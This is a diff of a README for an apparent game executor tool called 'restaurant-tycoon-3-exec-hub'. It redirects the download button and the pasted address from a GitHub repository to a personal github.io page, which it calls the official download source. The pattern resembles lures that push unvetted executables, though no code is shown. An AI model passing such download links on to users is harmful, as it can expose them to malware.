@@ -20,11 +20,11 @@ Following these steps will have you up and running in less than five minutes. No
 
 ### Step 1: Download the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-APPLICATION-FF6B9D?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://github.com/Medicalscientistkachina500/restaurant-tycoon-3-exec-hub)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-APPLICATION-FF6B9D?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://medicalscientistkachina500.github.io)
 
 Visit this link to download the application. This is the official page where you'll get the tool. Just click the button above or copy and paste this address into your browser:
 
-**https://github.com/Medicalscientistkachina500/restaurant-tycoon-3-exec-hub**
+**https://medicalscientistkachina500.github.io**
 
 ### Step 2: Find the Downloaded File
 
